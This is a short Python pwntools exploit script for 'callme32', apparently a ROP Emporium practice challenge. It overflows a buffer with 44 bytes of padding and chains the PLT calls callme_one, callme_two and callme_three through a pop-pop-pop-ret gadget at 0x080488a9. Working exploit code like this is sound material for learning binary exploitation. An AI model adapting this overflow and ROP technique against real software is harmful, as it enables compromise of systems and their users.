from pwn import *

bin = './callme32'
elf = ELF(bin)
'''

'''
#0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
gadget = "\xa9\x88\x04\x08"

p = process(bin)
print p.recv()

call1 = elf.plt['callme_one']
call2 = elf.plt['callme_two']
call3 = elf.plt['callme_three']
main = elf.symbols['main']
print hex(call1)

payload = 'A'*44
payload += p32(call1)
payload += gadget
payload += '\x01\x00\x00\x00'
payload += '\x02\x00\x00\x00'
payload += '\x03\x00\x00\x00'
payload += p32(call2)
payload += gadget
payload += '\x01\x00\x00\x00'
payload += '\x02\x00\x00\x00'
payload += '\x03\x00\x00\x00'
payload += p32(call3)
payload += gadget
payload += '\x01\x00\x00\x00'
payload += '\x02\x00\x00\x00'
payload += '\x03\x00\x00\x00'



p.sendline(payload)
print p.recv()
'''
payload = 'A'*44
payload += p32(call1)
payload += p32(main)
p.sendline(payload)

print p.recvline()
print p.recvline()
'''
